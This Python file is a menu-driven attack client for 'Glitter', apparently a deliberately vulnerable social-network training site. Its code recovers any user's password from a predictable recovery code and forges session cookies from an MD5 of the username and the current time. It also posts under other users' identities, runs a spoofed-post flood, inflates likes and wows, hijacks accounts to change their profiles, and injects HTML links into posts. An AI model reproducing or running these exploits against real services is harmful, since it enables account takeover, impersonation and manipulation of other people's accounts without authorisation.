import requests 
import json
import datetime
import sys
import random
from hashlib import md5

# =============================================================================
# CONFIGURATION
# =============================================================================

BASE_URL = "http://cyber.glitter.org.il"

URLS = {
    "login": f"{BASE_URL}/user",
    "like": f"{BASE_URL}/likes",
    "logout": f"{BASE_URL}/user/{{user_id}}",
    "likes": f"{BASE_URL}/likes",
    "user_search": f"{BASE_URL}/entities",
    "pass_req": f"{BASE_URL}/password-recovery-code-request",
    "pass_ver": f"{BASE_URL}/password-recovery-code-verification",
    "post_glit": f"{BASE_URL}/glit",
    "comment": f"{BASE_URL}/comments",
    "user_profile": f"{BASE_URL}/user"  
}

DEFAULT_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
}

session = requests.Session()
session.headers.update(DEFAULT_HEADERS)
current_user_info = None
sparkle_token = None

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

def num_to_letters(num):
    """Convert number to letters for password recovery."""
    return ''.join(chr(int(d) + ord('A')) for d in str(num))

def get_authenticated_headers():
    """Get headers with authentication cookie."""
    headers = DEFAULT_HEADERS.copy()
    if sparkle_token:
        headers["Cookie"] = f"sparkle={sparkle_token}"
    return headers

def handle_response(response, operation_name):
    """Handle API response and return data or None on error."""
    if response.status_code != 200:
        print(f"[ERROR] {operation_name} failed: {response.status_code} - {response.text}")
        return None
    
    try:
        return response.json() if response.text else True
    except json.JSONDecodeError:
        print(response.text)

def get_user_input(prompt, input_type=str):
    """Get user input with type validation."""
    while True:
        try:
            value = input(f"{prompt}: ").strip()
            if input_type == int:
                return int(value)
            return value
        except ValueError:
            print(f"Please enter a valid {input_type.__name__}")

# =============================================================================
# AUTHENTICATION FUNCTIONS
# =============================================================================

def login(username, password):
    """Authenticate user with the Glitter platform."""
    global current_user_info, sparkle_token
    
    try:
        response = session.post(
            URLS["login"],
            json=[username, password],
            auth=(username, password)
        )
        
        user_data = handle_response(response, "Login")
        if not user_data:
            print("Login failed")
            sys.exit(1)
        
        sparkle_token = user_data.get("sparkle")
        if not sparkle_token:
            print("Login failed: sparkle token missing")
            sys.exit(1)
        
        session.headers.update({"Cookie": f"sparkle={sparkle_token}"})
        current_user_info = user_data
        
        print(f"Successfully logged in as: {user_data['user']['screen_name']}")
        return user_data
        
    except requests.RequestException as e:
        print(f"Login request failed: {str(e)}")
        sys.exit(1)

def logout(user_id):
    """Logout user from the platform."""
    global current_user_info, sparkle_token
    
    try:
        url = URLS["logout"].format(user_id=user_id)
        session.delete(url)
        sparkle_token = None
        current_user_info = None
        print("Successfully logged out")
    except requests.RequestException as e:
        print(f"Logout failed: {str(e)}")

# =============================================================================
# USER MANAGEMENT FUNCTIONS
# =============================================================================

def get_user_by_username(username):
    """Fetch user information by username."""
    try:
        url = f"{URLS['user_search']}?searchType=WILDCARD&searchEntry={username}"
        response = session.get(url)
        users = handle_response(response, f"User search for '{username}'")
        
        if users and len(users) > 0:
            return users[0]
        else:
            print(f"User '{username}' not found")
            return None
            
    except requests.RequestException as e:
        print(f"Error searching for user '{username}': {str(e)}")
        return None

def get_user_by_id(user_id):
    """Fetch user information by user ID."""
    try:
        url = f"{URLS['user_search']}?searchType=ID&searchEntry={user_id}"
        response = session.get(url, headers=get_authenticated_headers())
        users = handle_response(response, f"User search for ID {user_id}")
        
        if users and len(users) > 0:
            return users[0]
        else:
            print(f"User with ID {user_id} not found")
            return None
            
    except requests.RequestException as e:
        print(f"Error searching for user ID {user_id}: {str(e)}")
        return None

def get_user_id(username):
    """Get user ID by username."""
    user = get_user_by_username(username)
    return user["id"] if user else None

# =============================================================================
# CONTENT MANAGEMENT FUNCTIONS
# =============================================================================

def post_glit(body, post_as_id, post_in_id, bg_color="#ffffff", font_color="#000000", when=None):
    """Post a glit (message) to the platform."""
    timestamp = when or datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    
    glit_data = {
        "id": -1,
        "feed_owner_id": post_in_id,
        "publisher_id": post_as_id,
        "publisher_screen_name": "",
        "publisher_avatar": "im1",
        "background_color": bg_color,
        "date": timestamp,
        "content": body,
        "font_color": font_color
    }
    
    try:
        response = session.post(URLS["post_glit"], json=glit_data)
        result = handle_response(response, "Post glit")
        if result:
            print("Glit posted successfully")
        return result
    except requests.RequestException as e:
        print(f"Failed to post glit: {str(e)}")
        return None

def create_like_data(user_info, glit_id):
    """
    Constructs the JSON payload for liking a glit.
    """
    return {
        "glit_id": glit_id,
        "user_id": user_info["user"]["id"],
        "user_screen_name": user_info["user"]["screen_name"],
        "id": -1 
    }

def like_glit(user_info, glit_id, debug=False):
    """
    Likes a specific glit using the Glitter API.
    This function replaces the original socket-based `send_likes`.
    """
    like_data = create_like_data(user_info, glit_id)

    if debug:
        print("Like data:", like_data)

    try:
        response = session.post(
            URLS["like"],
            json=like_data,
            headers=get_authenticated_headers()
        )

        result = handle_response(response, f"Like glit {glit_id}")
        if result:
            print(f"Glit {glit_id} liked successfully")
        return result
    except requests.RequestException as e:
        print(f"Failed to like glit {glit_id}: {str(e)}")
        return None

def set_like_amount(glit_id, like_amount, user_id):
    """
    Sets a specified number of likes for a given glit.
    It repeatedly calls `like_glit` for each like.
    """
    user_info = get_user_by_id(user_id) # Fetch user details for screen_name and ID
    if not user_info:
        print(f"User with ID {user_id} not found or session expired. Cannot set likes.")
        return

    # Construct a simplified user_info dict compatible with create_like_data
    info = {
        "user": {
            "id": user_info["id"],
            "screen_name": user_info.get("screen_name", "")
        },
        "sparkle": sparkle_token
    }

    success_count = 0
    for i in range(like_amount):
        if like_glit(info, glit_id):
            success_count += 1
        else:
            print(f"Failed to add like {i+1} of {like_amount}.") # Provide more feedback on individual failures

    print(f"Successfully added {success_count}/{like_amount} likes to glit {glit_id}")
    print(f"Successfully added {success_count}/{like_amount} likes to glit {glit_id}")
def set_wows_to_glit(glit_id, amount, user_id):
    """
    Sets a specified number of wows for a given glit.
    It repeatedly calls the Glitter API to add wows.
    """
    glit_id = int(glit_id)
    amount = int(amount)
    user_id = int(user_id)
    url = f"{BASE_URL}/wows/"
    user_info = get_user_by_id(user_id)
    if not user_info:
        print(f"User with ID {user_id} not found or session expired. Cannot set wows.")
        return
    info = {
        "glit_id": glit_id,
        "user_id": user_info["id"],
        "user_screen_name": user_info.get("screen_name", ""),
        "id": -1
    }
    success_count = 0
    for i in range(amount):
        try:
            response = session.post(url, json=info, headers=get_authenticated_headers())
            if response.status_code == 200:
                success_count += 1
                print(f"Wow {i+1} added successfully")
            else:
                print(f"Failed to add wow {i+1}: {response.status_code} - {response.text}")
        except requests.RequestException as e:
            print(f"Request failed for wow {i+1}: {str(e)}")

def get_user_glits(user_id):
    """Fetch all glits from a specific user."""
    try:
        url = f"{URLS['post_glit']}?feed_owner_id={user_id}"
        response = session.get(url)
        glits = handle_response(response, f"Get glits for user {user_id}")
        return glits or []
    except requests.RequestException as e:
        print(f"Failed to fetch glits for user {user_id}: {str(e)}")
        return []

def show_users_glits(username):
    """Display glits from a user by username."""
    user_id = get_user_id(username)
    if not user_id:
        print(f"User '{username}' not found")
        return
    
    glits = get_user_glits(user_id)
    if not glits:
        print(f"No glits found for user '{username}'")
        return
    
    print(f"\n{'='*20} Glits from {username} {'='*20}")
    for glit in glits:
        print(f"Glit ID: {glit['id']}")
        print(f"Content: {glit['content']}")
        print(f"Date: {glit['date']}")
        print("-" * 50)

# =============================================================================
# ACCOUNT MANAGEMENT FUNCTIONS
def change_screen_name(username, screen_name, avatar, description, privacy, gender, mail):
    """
    Changes user profile settings including screen name, avatar, description, etc.
    """
    URL = f"{BASE_URL}/user/"
    normalized_privacy = privacy.capitalize() if privacy.lower() in ["public", "private"] else privacy

    user = get_user_by_username(username)
    if not user:
        print("User not found.")
        return

    password = get_password(username)
    if not password:
        print("Could not recover password for user.")
        return

    # Remove quotes and whitespace from password if needed
    password = password.replace('"', '').replace(' ', '')

    # Login to get valid session/cookie
    login(username, password)

    content = {
        "screen_name": screen_name,
        "avatar": f"im{avatar}",
        "description": description,
        "privacy": normalized_privacy,
        "id": user["id"],
        "user_name": username,
        "password": password,
        "gender": gender,
        "mail": mail
    }

    try:
        res = session.put(URL, json=content, headers=get_authenticated_headers())
        if res.status_code == 200:
            print(" Changes saved successfully")
        else:
            print(f" Server responded with error: {res.status_code} - {res.text}")
    except Exception as e:
        print(" Something went wrong:", e)

    
def force_on_glanceship(requester_user_id, responder_user_id):
    """
    Sends a POST request to force a glanceship between two users on Glitter.
    """
    if not sparkle_token:
        print("Session cookie (sparkle_token) not set. Please use 'Get account cookie' first.")
        return

    data = {
        "requester_user_id": requester_user_id,
        "responder_user_id": responder_user_id,
        "glanceship_type": "Glanced"
    }
    headers = DEFAULT_HEADERS.copy()
    headers["Cookie"] = f"sparkle={sparkle_token}"
    headers["User-Agent"] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
    headers["Origin"] = 'http://cyber.glitter.org.il/'
    headers["Referer"] = 'http://cyber.glitter.org.il/home'

    url = f"{BASE_URL}/glanceship/"
    try:
        response = requests.post(url, json=data, headers=headers)
        print(f"Response status: {response.status_code}")
        print(f"Response body: {response.text}")
        if response.status_code == 200:
            print("Glanceship forced successfully.")
        else:
            print("Failed to force glanceship.")
        return response
    except requests.RequestException as e:
        print(f"Error sending glanced request: {e}")
        return None
# =============================================================================
# SECURITY TESTING FUNCTIONS
# =============================================================================
def get_password(username):
    """Recover user password using predictable recovery code."""
    try:
        # Request password recovery
        session.post(URLS["pass_req"], json=username)
        
        # Generate predictable recovery code
        date = datetime.datetime.now().strftime("%d%m")
        user_id = get_user_id(username)
        if not user_id:
            print("Could not find user ID for password recovery")
            return None
        
        id_str = num_to_letters(user_id)
        time = datetime.datetime.now().strftime("%H%M")
        code = date + id_str + time
        
        if len(code) != 12:
            print(f"Warning: Generated code is not 12 characters: {code}")
        
        # Verify code and get password
        response = session.post(URLS["pass_ver"], json=[username, code])
        
        if response.status_code == 200:
            return response.text
        else:
            print("Password recovery failed")
            return None
            
    except requests.RequestException as e:
        print(f"Password recovery failed: {str(e)}")
        return None

def spoofed_glit_attack(spoofed_name, body, bg_color="#121212", font_color="#FFFFFF"):
    """Perform spoofed glit attack for testing."""
    print("Starting spoofed glit attack...")
    success_count = 0
    for i in range(30):
        now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        glit_data = {
            "id": -1,
            "feed_owner_id": random.randint(1, 53076),
            "publisher_id": random.randint(1, 53076),
            "publisher_screen_name": spoofed_name,
            "publisher_avatar": "im1",
            "background_color": bg_color,
            "date": now,
            "content": f"{body}#{i}",
            "font_color": font_color
        }
        
        try:
            response = session.post(URLS["post_glit"], json=glit_data)
            if response.status_code == 200:
                success_count += 1
                print(f"[{i+1}/30] Posted successfully")
            else:
                print(f"[{i+1}/30] Failed: {response.status_code} - {response.text}")
        except requests.RequestException as e:
            print(f"[{i+1}/30] Request failed: {str(e)}")
    print(f"Attack completed. {success_count}/30 glits posted successfully")
    
def post_corrupted_glit():
    """
    Posts a glit with a link as content (corrupted glit example).
    The link and display text are provided by user input.
    """
    if not current_user_info:
        print("You must be logged in to post a corrupted glit.")
        return
    link_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    display_text = get_user_input("Enter the display text for the link")
    body = (
        f'<a href="{link_url}" '
        'style="color:black; background-color:white; text-decoration:none;">\n'
        f'{display_text}\n'
        '</a>'
    )
    post_glit(
        body=body,
        post_as_id=current_user_info["user"]["id"],
        post_in_id=current_user_info["user"]["id"],
        bg_color="White",
        font_color="black"
    )
    print("Corrupted glit posted.")

def login_into_other_account():
    """Login into another account for testing purposes."""
    global current_user_info, sparkle_token, session
    print("\nLogging into another account...")
    username = get_user_input("Enter username")
    password = handle_password_recovery(username) 
    if password:
        password = password.replace('"', '').replace(' ', '')
        print(f"Using password for login: {password}") # Careful with printing passwords
        # Create a new session for the new user
        session.cookies.clear()
        session.headers.update(DEFAULT_HEADERS)
        user_info = login(username, password)
        if user_info:
            current_user_info = user_info
            sparkle_token = user_info.get("sparkle")
            session.headers.update({"Cookie": f"sparkle={sparkle_token}"})
            print(f"Successfully logged in as: {user_info['user']['screen_name']}")
        else:
            print("Login failed. Please check your credentials.")
    else:
        print("Password input failed. Cannot login.")

def get_account_cookie():
    global sparkle_token
    print("\nEntering account by session cookie and username...")

    username = input("Enter username for session cookie login: ").strip()

    user_id = get_user_id(username)
    if not user_id:
        print(f" Could not find user ID for username '{username}'.")
        return

    now = datetime.datetime.now()
    todaysdate = now.strftime("%d%m%Y")
    todayhourandminute = now.strftime("%H%M")
    md5hashedusername = md5(username.encode()).hexdigest()
    sparkle_token = f"{todaysdate}.{md5hashedusername}.{todayhourandminute}.{todaysdate}"
    print(f"Generated session cookie: {sparkle_token}")
    return sparkle_token

# =============================================================================
# MENU DISPLAY FUNCTIONS
# =============================================================================

def display_menu():
    """Display the main menu options."""
    print("\n" + "="*60)
    print("                    GLITTER CLIENT MENU")
    print("="*60)
    print("\n USER MANAGEMENT:")
    print("    1.  Get user info by username")
    print("    2.  Get user info by ID")
    print("    3.  Get user ID by username")
    print("    4.  Get Username by ID")
    print("\n CONTENT MANAGEMENT:")
    print("    5.  Post a glit without entering an other account")
    print("    6.  Set like amount for a glit")
    print("    7.  Add Wows to Glit")
    print("\n ACCOUNT SETTINGS:")
    print("    8. Change Other`s account Screen Name")
    print("    9. Make a Forced glanceship with another user")
    print("\n SECURITY TESTING:")
    print("    10. Spoofed glit attack")
    print("\n BOUNTIES:")
    print("    11. Password recovery test")
    print("    12. Get account cookie")
    print("    13. Post corrupted glit")
    print("    14. Login into another account")
    print("\n SYSTEM:")
    print("    0.  Exit")
    print("="*60)

def display_welcome():
    """Display welcome message."""
    print("\n" + "="*60)
    print("WELCOME TO GLITTER CLIENT")
    print("="*60)

# =============================================================================
# MENU HANDLER FUNCTIONS
# =============================================================================
def show_account_info():
    """Display current user account information."""
    if not current_user_info:
        print("No user is currently logged in.")
        return
    
    user = current_user_info["user"]
    print("\n" + "="*20 + " Current User Info " + "="*20)
    print(f"ID: {user['id']}")
    print(f"Screen Name: {user['screen_name']}")
    print(f"Email: {user.get('email', 'N/A')}")
    print(f"Avatar: {user.get('avatar', 'N/A')}")
    print("="*60)

def handle_get_user_by_username():
    """Handle menu option 1: Get user by username."""
    username = get_user_input("Enter username")
    user_info = get_user_by_username(username)
    if user_info:
        print(f"\n User Info:")
        print(f"    ID: {user_info.get('id', 'N/A')}")
        print(f"    Screen Name: {user_info.get('screen_name', 'N/A')}")
        print(f"    Email: {user_info.get('email', 'N/A')}")
        print(f"    Avatar: {user_info.get('avatar', 'N/A')}")
    else:
        print(" User not found")

def handle_get_user_by_id():
    """Handle menu option 2: Get user by ID."""
    user_id = get_user_input("Enter user ID", int)
    user_info = get_user_by_id(user_id)
    if user_info:
        print(f"\n User Info:")
        print(f"    ID: {user_info.get('id', 'N/A')}")
        print(f"    Screen Name: {user_info.get('screen_name', 'N/A')}")
        print(f"    Email: {user_info.get('email', 'N/A')}")
        print(f"    Avatar: {user_info.get('avatar', 'N/A')}")
    else:
        print(" User not found")

def handle_get_user_id():
    """Handle menu option 3: Get user ID."""
    username = get_user_input("Enter username")
    user_id = get_user_id(username)
    if user_id:
        print(f" User ID for '{username}': {user_id}")
    else:
        print(" User not found")

def handle_show_user_glits():
    """Handle menu option 4: Show user glits."""
    username = get_user_input("Enter username")
    show_users_glits(username)

def handle_post_glit():
    """Handle menu option 5: Post glit."""
    post_id = int(get_user_input("Enter ID of the user to post as"))
    get_id = int(get_user_input("Enter ID of the user to post in"))
    body = get_user_input("Enter glit content")
    bg_color = get_user_input("Enter background color (hex, default: #ffffff)") or "#ffffff"
    font_color = get_user_input("Enter font color (hex, default: #000000)") or "#000000"
    
    post_glit(
        body=body,
        post_as_id=post_id,
        post_in_id=get_id,
        bg_color=bg_color,
        font_color=font_color
    )

def handle_set_like_amount():
    """Handle menu option 6: Set like amount."""
    glit_id = get_user_input("Enter glit ID", int)
    like_amount = get_user_input("Enter number of likes", int)
    set_like_amount(glit_id, like_amount, current_user_info["user"]["id"])

def handle_change_screen_name():
    """Handle menu option 8: Change Screen name."""
    if not current_user_info:
        print("You must be logged in to change screen name.")
        return
    username = input("Enter username to change screen name: ").strip() 
    new_screen_name = input("Enter new screen name: ").strip()
    avatar = input("Enter avatar number (e.g., 1): ").strip() or "1"
    description = input("Enter new description: ").strip()
    privacy = input("Enter privacy (e.g., 'Public' or 'Private'): ").strip() 
    gender = input("Enter gender (e.g., 'Male', 'Female', 'leave blank'): ").strip() 
    mail = input("Enter email: ").strip() or current_user_info["user"].get("email", "")
    change_screen_name(
        username=username,
        screen_name=new_screen_name,
        avatar=avatar,
        description=description,
        privacy=privacy,
        gender=gender,
        mail=mail
    )

def handle_add_wows():
    """Handle menu option 7: Add Wows To Glit."""
    amount = get_user_input("Enter amount of Wows to add")
    glit_id = get_user_input("Enter glit ID")
    user_id = get_user_input("Enter user ID to add wows from")
    set_wows_to_glit(glit_id, amount, user_id)

def handle_force_glance():
    """Handle menu option 9: Force Glancement."""
    responder_user_id = int(get_user_input("Enter responder user ID"))
    force_on_glanceship(current_user_info["user"]["id"], responder_user_id)

def handle_password_recovery(username):
    """Handle menu option 11: Password recovery test."""
    password = get_password(username)
    if password:
        print(f" Recovered password for '{username}': {password}")
        return password
    else:
        print(" Password recovery failed")

def handle_session_cookie_test():
    """Handle menu option 12: Session cookie test."""
    get_account_cookie()

def handle_spoofed_attack():
    """Handle menu option 10: Spoofed glit attack."""
    spoofed_name = get_user_input("Enter spoofed username (Doesnt Affect Anything TBH ;P ) ")
    body = get_user_input("Enter glit content (Doesnt Affect Anything TBH ;P )") 
    spoofed_glit_attack(spoofed_name, body)
def handle_get_username_by_id():
    """Handle menu option 4: Get username by ID."""
    user_id = get_user_input("Enter user ID", int)
    user_info = get_user_by_id(user_id)
    if user_info:
        print(f" Username for ID {user_id}: {user_info.get('screen_name', 'N/A')}")
    else:
        print(" User not found")
# =============================================================================
# MAIN APPLICATION LOGIC
# =============================================================================
def authenticate_user():
    """Handle user authentication."""
    print("\n AUTHENTICATION REQUIRED")
    print("-" * 30)
    
    username = get_user_input("Username")
    password = get_user_input("Password")
    
    print("\n Logging in...")
    return login(username, password)

def handle_menu_choice(choice):
    """Handle user menu selection using match-case switch-case pattern."""
    match choice:
        case 1:
            handle_get_user_by_username()
        case 2:
            handle_get_user_by_id()
        case 3:
            handle_get_user_id()
        case 4:
            handle_get_username_by_id()
        case 5:
            handle_post_glit()
        case 6:
            handle_set_like_amount()
        case 7:
            handle_add_wows()
        case 8:
            handle_change_screen_name()
        case 9:
            handle_force_glance() 
        case 10:
            handle_spoofed_attack() 
        case 11:
            username = get_user_input("Enter username for password:")
            handle_password_recovery(username)
        case 12:
            handle_session_cookie_test()
        case 13:
            post_corrupted_glit()
        case 14:
            login_into_other_account()
        case 0:
            return False 
        case _:
            print("Invalid choice. Please select a number from 0-14.")
    return True
